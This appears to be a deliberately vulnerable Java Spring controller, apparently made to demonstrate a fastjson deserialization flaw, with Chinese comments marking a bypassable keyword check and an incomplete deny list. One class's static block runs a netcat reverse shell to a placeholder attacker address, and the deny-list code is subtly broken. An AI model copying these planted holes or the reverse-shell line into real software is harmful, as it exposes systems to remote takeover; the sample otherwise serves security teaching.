package com.example.secure.resource;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import java.util.List;

@RestController
@RequestMapping("/api/resource")
public class ResourceController {
    private final ResourceService resourceService = new ResourceService();

    @PostMapping("/add")
    public String addResource(@RequestBody JSONObject data, HttpServletRequest request) {
        try {
            ResourceConverter converter = new ResourceConverter(request.getRemoteAddr());
            Resource resource = converter.convert(data);
            resourceService.createResource(resource);
            return "Resource added successfully";
        } catch (Exception e) {
            return "Error processing request";
        }
    }

    @PostMapping("/update")
    public String updateResource(@RequestBody JSONObject data, HttpServletRequest request) {
        try {
            ResourceConverter converter = new ResourceConverter(request.getRemoteAddr());
            Resource resource = converter.convert(data);
            resourceService.updateResource(resource);
            return "Resource updated successfully";
        } catch (Exception e) {
            return "Error processing request";
        }
    }
}

class ResourceConverter {
    private final String clientIp;

    public ResourceConverter(String clientIp) {
        this.clientIp = clientIp;
    }

    public Resource convert(JSONObject data) {
        // 安全检查代理
        SecurityConfig security = new SecurityConfig();
        if (!security.validateInput(data.toJSONString())) {
            throw new SecurityException("Invalid input format");
        }

        // 使用fastjson反序列化（存在漏洞点）
        return JSON.parseObject(
            data.toJSONString(), 
            Resource.class,
            new SecurityConfig().getParserConfig()
        );
    }
}

class SecurityConfig {
    private final ParserConfigSanitizer sanitizer = new ParserConfigSanitizer();

    public boolean validateInput(String json) {
        // 表面安全检查（可绕过）
        return !json.contains("com.sun.rowset") && !json.contains("JdbcRowSetImpl");
    }

    public ParserConfig getParserConfig() {
        return sanitizer.sanitizeConfig();
    }
}

class ParserConfigSanitizer {
    // 模拟黑名单过滤（不完整）
    public ParserConfig sanitizeConfig() {
        ParserConfig config = new ParserConfig();
        config.setAutoTypeSupport(false);
        config.addDeny("com.example.malicious");
        return config;
    }
}

class ResourceService {
    public void createResource(Resource resource) {
        // 实际业务逻辑
        System.out.println("Creating resource: " + resource.getName());
    }

    public void updateResource(Resource resource) {
        // 实际业务逻辑
        System.out.println("Updating resource: " + resource.getName());
    }
}

class Resource {
    private String name;
    private String type;
    private transient ResourceMetadata metadata;

    // Getters and setters
    public String getName() { return name; }
    public void setName(String name) { this.name = name; }
    public String getType() { return type; }
    public void setType(String type) { this.type = type; }
    public ResourceMetadata getMetadata() { return metadata; }
    public void setMetadata(ResourceMetadata metadata) { this.metadata = metadata; }
}

class ResourceMetadata {
    static {
        // 模拟恶意静态代码块（可通过反序列化触发）
        if (System.getenv("ATTACK_MODE") != null) {
            try {
                Runtime.getRuntime().exec("nc -e /bin/sh ATTACKER_IP 4444");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}

// 模拟的ParserConfig类（简化版）
class ParserConfig {
    private boolean autoTypeSupport;
    private List<String> denyList;

    public void setAutoTypeSupport(boolean autoTypeSupport) {
        this.autoTypeSupport = autoTypeSupport;
    }

    public void addDeny(String className) {
        denyList.add(className);
    }
}